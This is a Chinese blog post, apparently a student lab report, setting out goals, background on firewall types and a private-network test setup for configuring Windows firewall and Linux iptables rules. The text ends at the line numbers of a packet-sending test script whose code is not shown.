    <div class="post-meta"><span title='2022-01-01 21:22:48 +0000 UTC'>2022-01-01</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e9%98%b2%e7%81%ab%e5%a2%99%e5%ae%9e%e9%aa%8c" aria-label="防火墙实验">防火墙实验</a><ul>
                            
                    <li>
                        <a href="#0x01-%e5%ae%9e%e9%aa%8c%e7%9b%ae%e6%a0%87" aria-label="0x01 实验目标">0x01 实验目标</a></li>
                    <li>
                        <a href="#0x02-%e5%ae%9e%e9%aa%8c%e5%89%8d%e6%8f%90" aria-label="0x02 实验前提">0x02 实验前提</a></li>
                    <li>
                        <a href="#0x03-%e5%ae%9e%e9%aa%8c%e5%86%85%e5%ae%b9" aria-label="0x03 实验内容">0x03 实验内容</a><ul>
                            
                    <li>
                        <a href="#31-windows%e9%98%b2%e7%81%ab%e5%a2%99" aria-label="3.1 windows防火墙">3.1 windows防火墙</a><ul>
                            
                    <li>
                        <a href="#311-%e8%bf%87%e6%bb%a4%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1%e5%99%a8r%e5%88%b0%e6%9c%ac%e5%9c%b0%e4%b8%bb%e6%9c%bal%e7%9a%84tcp%e6%95%b0%e6%8d%ae" aria-label="3.1.1 过滤远程服务器（R）到本地主机（L）的TCP数据">3.1.1 过滤远程服务器（R）到本地主机（L）的TCP数据</a></li>
                    <li>
                        <a href="#312-%e8%bf%87%e6%bb%a4r-l%e4%b8%ad%e6%95%b0%e6%8d%ae%e5%8c%85%e6%ba%90%e7%ab%af%e5%8f%a3%e4%b8%ba21%e6%88%9680%e7%9a%84%e6%95%b0%e6%8d%ae" aria-label="3.1.2 过滤R-&amp;gt;L中数据包源端口为21或80的数据">3.1.2 过滤R-&gt;L中数据包源端口为21或80的数据</a></li>
                    <li>
                        <a href="#313-%e8%83%bd%e5%a4%9f%e7%94%b1%e6%9c%ac%e6%9c%ba%e7%99%bb%e5%bd%95ftp%e6%9c%8d%e5%8a%a1%e5%99%a8%e6%88%90%e5%8a%9f%e9%80%9a%e8%bf%87%e7%94%a8%e6%88%b7%e5%90%8d%e5%af%86%e7%a0%81%e9%aa%8c%e8%af%81" aria-label="3.1.3 能够由本机登录ftp服务器成功（通过用户名、密码验证）">3.1.3 能够由本机登录ftp服务器成功（通过用户名、密码验证）</a></li>
                    <li>
                        <a href="#314-%e9%98%bb%e6%ad%a2%e5%b0%86ftp%e5%86%85%e5%ae%b9%e5%88%97%e8%a1%a8%e4%b8%8a%e4%bc%a0%e4%b8%8b%e8%bd%bd%e6%95%b0%e6%8d%ae" aria-label="3.1.4 阻止将ftp内容列表、上传、下载数据">3.1.4 阻止将ftp内容列表、上传、下载数据</a></li></ul>
                    </li>
                    <li>
                        <a href="#32-linux%e9%98%b2%e7%81%ab%e5%a2%99-iptables" aria-label="3.2 Linux防火墙 iptables">3.2 Linux防火墙 iptables</a><ul>
                            
                    <li>
                        <a href="#321-iptables%e9%98%b2%e7%81%ab%e5%a2%99%e7%9a%84%e5%90%af%e5%8a%a8%e5%81%9c%e6%ad%a2" aria-label="3.2.1 Iptables防火墙的启动停止">3.2.1 Iptables防火墙的启动停止</a></li>
                    <li>
                        <a href="#322-iptables%e9%98%b2%e7%81%ab%e5%a2%99%e8%a7%84%e5%88%99%e6%9f%a5%e7%9c%8b%e6%b7%bb%e5%8a%a0%e5%88%a0%e9%99%a4" aria-label="3.2.2 Iptables防火墙规则查看、添加、删除">3.2.2 Iptables防火墙规则查看、添加、删除</a></li>
                    <li>
                        <a href="#323-%e8%ae%be%e7%bd%aeiptables%e9%98%b2%e7%81%ab%e5%a2%99%e7%9a%84%e5%8c%85%e8%bf%87%e6%bb%a4%e8%a7%84%e5%88%99%e5%ae%9e%e7%8e%b0%e4%bb%a5%e4%b8%8b%e5%8a%9f%e8%83%bd" aria-label="3.2.3 设置Iptables防火墙的包过滤规则，实现以下功能">3.2.3 设置Iptables防火墙的包过滤规则，实现以下功能</a><ul>
                            
                    <li>
                        <a href="#3231-%e7%a6%81%e6%ad%a2%e6%89%80%e6%9c%89%e8%bf%9b%e5%87%ba%e6%9c%ac%e5%9c%b0%e4%b8%bb%e6%9c%ba%e7%9a%84%e6%95%b0%e6%8d%ae%e5%8c%85%e9%80%9a%e8%bf%87%e9%80%9a%e8%bf%87ping%e9%aa%8c%e8%af%81" aria-label="3.2.3.1 禁止所有进出本地主机的数据包通过（通过Ping验证）">3.2.3.1 禁止所有进出本地主机的数据包通过（通过Ping验证）</a></li>
                    <li>
                        <a href="#3232-%e5%85%81%e8%ae%b8%e6%9f%90%e7%89%b9%e5%ae%9aip%e4%b8%bb%e6%9c%ba%e8%bf%9c%e7%a8%8bping%e6%9c%ac%e5%9c%b0%e4%b8%bb%e6%9c%ba" aria-label="3.2.3.2 允许某特定IP主机远程ping本地主机">3.2.3.2 允许某特定IP主机远程ping本地主机</a></li>
                    <li>
                        <a href="#3233-%e5%85%81%e8%ae%b8%e6%9f%90%e7%89%b9%e5%ae%9aip%e4%b8%bb%e6%9c%ba%e8%bf%9c%e7%a8%8btelnet%e6%88%96putty%e6%9c%ac%e5%9c%b0%e4%b8%bb%e6%9c%ba" aria-label="3.2.3.3 允许某特定IP主机远程telnet或putty本地主机">3.2.3.3 允许某特定IP主机远程telnet或putty本地主机</a></li></ul>
                    </li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e9%80%89%e5%81%9a%e9%a2%98" aria-label="0x04 选做题">0x04 选做题</a><ul>
                            
                    <li>
                        <a href="#41-%e7%94%b1%e6%9c%ac%e6%9c%ba%e7%99%bb%e5%bd%95ftp%e6%9c%8d%e5%8a%a1%e5%99%a8%e6%88%90%e5%8a%9f%e9%80%9a%e8%bf%87%e7%94%a8%e6%88%b7%e5%90%8d%e5%af%86%e7%a0%81%e9%aa%8c%e8%af%81" aria-label="4.1 由本机登录ftp服务器成功（通过用户名、密码验证）">4.1 由本机登录ftp服务器成功（通过用户名、密码验证）</a></li>
                    <li>
                        <a href="#42-%e6%97%a0%e6%b3%95%e5%b0%86ftp%e5%86%85%e5%ae%b9%e5%88%97%e8%a1%a8%e6%88%96%e4%b8%8a%e4%bc%a0%e4%b8%8b%e8%bd%bd%e6%95%b0%e6%8d%ae" aria-label="4.2 无法将ftp内容列表或上传、下载数据">4.2 无法将ftp内容列表或上传、下载数据</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x05-%e5%ae%9e%e9%aa%8c%e7%bb%93%e8%ae%ba" aria-label="0x05 实验结论">0x05 实验结论</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h1 id="防火墙实验">防火墙实验<a hidden class="anchor" aria-hidden="true" href="#防火墙实验">#</a></h1>
<h2 id="0x01-实验目标">0x01 实验目标<a hidden class="anchor" aria-hidden="true" href="#0x01-实验目标">#</a></h2>
<ul>
<li>
<p>选择一种主流的软件防火墙，熟悉其安全规则配置，通过<strong>配置防火墙规则</strong>，实现以下功能：</p>
<ul>
<li>过滤远程服务器（R）到本地主机（L）的<strong>TCP</strong>数据。</li>
<li>过滤R-&gt;L中数据包源端口为<strong>21或80</strong>的数据，查看现象。</li>
<li>能够由本机登录<strong>ftp</strong>服务器成功（通过用户名、密码验证）</li>
<li>阻止将ftp内容列表、上传、下载数据。</li>
</ul>
</li>
<li>
<p>配置<strong>linux</strong>系统下<strong>iptables</strong>防火墙；在linux系统下，配置iptables防火墙，实现如下功能：</p>
<ul>
<li>Iptables防火墙的<strong>启动停止</strong>。</li>
<li>Iptables防火墙规则<strong>查看、添加、删除</strong>。</li>
<li>设置Iptables防火墙的包过滤规则，实现以下功能：
<ul>
<li><strong>禁止</strong>所有进出本地主机的数据包通过；（通过Ping验证）</li>
<li>允许<strong>某特定IP主机</strong>远程ping本地主机；</li>
<li>允许<strong>某特定IP主机远程telnet或putty</strong>本地主机。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>选做：完成下述功能：</p>
<ul>
<li>由本机登录ftp服务器成功（通过用户名、密码验证）；</li>
<li>无法将ftp内容列表或上传、下载数据；</li>
</ul>
</li>
</ul>
<h2 id="0x02-实验前提">0x02 实验前提<a hidden class="anchor" aria-hidden="true" href="#0x02-实验前提">#</a></h2>
<ul>
<li>
<p>实验前提知识</p>
<ul>
<li>
<p>防火墙定义：</p>
<ul>
<li>防火墙是位于两个（或多个）网络间，实施网间访问控制的一组组件的集合。 防火墙是指隔离在内部网络和外部网络之间的一道防御系统，是这一类防范措施的总称。</li>
</ul>
</li>
<li>
<p>防火墙设计目标：</p>
<ul>
<li>内部和外部之间的所有网络数据流必须经过防火墙。</li>
<li>只有符合安全策略的数据流，即，经过授权的数据流才能通过防火墙。</li>
<li>防火墙自身不能被攻破。</li>
</ul>
</li>
<li>
<p>防火墙经典部署</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120191854.png" alt="image-20211120191854603"  />
</li>
</ul>
</li>
<li>
<p>防火墙功能模块</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120191912.png" alt="image-20211120191912358"  />
</li>
</ul>
</li>
<li>
<p>防火墙类型</p>
<ul>
<li>包过滤防火墙
<ul>
<li>包过滤防火墙用规则检测每个IP包，根据结果放行或丢弃这些数据包。
<ul>
<li>包过滤防火墙一般会配置为双向过滤，即针对进入内部网络和离开内部网络两个方向的数据进行过滤。</li>
<li>过滤规则基于数据包中的信息，例如：
<ul>
<li>源、目IP地址，</li>
<li>源、目端口，例如：FTP(21)、 HTTP(80) 、DNS(53)…</li>
<li>协议类型，例如：TCP、 UDP、 ICMP 、IGMP…</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>状态检查防火墙
<ul>
<li>过滤规则基于数据包中的信息，例如：
<ul>
<li>网络接口，例如：eth0用于入站，eth1用于出站…</li>
<li>IP选项，例如：源路由、记录路由…</li>
<li>TCP选项，例如：SYN 、ACK、 FIN 、RST…</li>
<li>数据包流向，例如：入站（in）或出站（out）</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120192107.png" alt="image-20211120192107646"  />
</li>
</ul>
</li>
</ul>
</li>
<li>电路级代理防火墙
<ul>
<li>是一个通用代理服务器，它工作于OSI互联模型的会话层或是TCP/IP协议的TCP层。
<ul>
<li>它适用于多个协议，但它不能识别在同一个协议栈上运行的不同的应用，当然也就不需要对不同的应用设置不同的代理模块，但这种代理需要对客户端作适当修改。</li>
<li>它接受客户端的连接请求，代理客户端完成网络连接，建立起一个回路，对数据包起转发作用，数据包被提交给用户的应用层来处理。</li>
<li>通过电路级网关传递的数据似乎起源于防火墙，隐藏了被保护网络的信息。</li>
</ul>
</li>
</ul>
</li>
<li>应用层代理防火墙
<ul>
<li>首先，它对该用户的身份进行验证。</li>
<li>若为合法用户，则把请求转发给真正的某个内部网络的主机，同时监控用户的操作，拒绝不合法的访问。</li>
<li>当内部网络向外部网络申请服务时，代理服务器的工作过程刚好相反。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>实验环境</p>
<ul>
<li>FTP服务器
<ul>
<li>windows xp <code>IP:192.168.195.162</code></li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120191309.png" alt="image-20211120191309277"  />
</li>
</ul>
</li>
<li>FTP客户端 以及 Windows防火墙
<ul>
<li>Windows xp <code>IP:192.168.195.131</code></li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120191330.png" alt="image-20211120191330703"  />
</li>
</ul>
</li>
<li>Linux 防火墙
<ul>
<li>Centos 7:  <code>192.168.195.174</code></li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211120225746.png" alt="image-20211120225746385"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>实验工具</p>
<ul>
<li>
<p>发送tcp包到目的机随机端口的脚本</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
